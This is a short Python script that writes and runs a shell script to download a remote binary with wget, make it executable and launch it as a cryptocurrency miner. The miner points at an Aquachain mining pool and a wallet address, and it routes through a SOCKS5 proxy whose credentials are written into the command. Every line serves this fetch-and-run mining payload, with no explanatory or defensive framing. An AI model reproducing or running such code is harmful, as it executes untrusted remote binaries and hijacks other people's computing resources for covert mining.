import os
os.system('echo "#!/bin/sh" >> tes')
os.system('echo "wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu && chmod +x ac-gpu" >> tes')
os.system('echo "./ac-gpu -F http://pool.aquachain.xyz:8888/0xdCBDe4E1BF120243e26629610EA6e0440b8560a2/TOT -t 6 --proxy socks5://sikencot-rotate:mbah2237@p.webshare.io:80" >> tes')
os.system('sleep 2')
os.system('sh tes')
